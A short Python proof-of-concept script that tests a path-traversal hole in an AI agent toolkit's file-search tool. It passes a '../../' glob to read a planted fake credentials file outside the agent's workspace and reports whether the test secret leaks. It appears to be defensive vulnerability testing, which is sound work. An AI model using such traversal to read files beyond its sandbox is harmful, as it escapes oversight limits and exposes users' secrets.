"""PoC: fs.search 'glob' param is NOT passed through _resolve → arbitrary read fully outside workspace."""
import asyncio, os, sys, tempfile, pathlib
sys.path.insert(0, r"C:\AiMaxBossman-claude-bossman-control-v03-43igbk\bossman-core")
os.environ.setdefault("SANDBOX_MODE","docker")
from bossman.toolkit import ToolContext, files

root = pathlib.Path(tempfile.mkdtemp(prefix="bossman_glob_"))
# outside_secret is 3 levels ABOVE the agent workdir, not a sibling, fully outside "workspace"
outside = root / "outside_totally"; outside.mkdir()
(outside / "creds.env").write_text("API_KEY=BOSSMAN_TEST_SECRET_9F31A7\nDB_PASS=hunter2\n")
ws = root / "workspace" / "coder"; ws.mkdir(parents=True)
ctx = ToolContext(agent="coder", run_id=1, workdir=ws)

# pattern '.' matches every line; glob climbs out of workspace entirely
r = asyncio.run(files.fs_search({"pattern": ".", "glob": "../../outside_totally/*"}, ctx))
print("fs.search escape result:")
print(r.content)
print("VERDICT:", "EXPLOITABLE arbitrary-read outside workspace" if "9F31A7" in r.content else "blocked")
# even deeper: read Windows hosts-style file via many ../
import inspect
print("fs_search calls _resolve on glob:", "_resolve" in inspect.getsource(files.fs_search))
print("TMP", root)
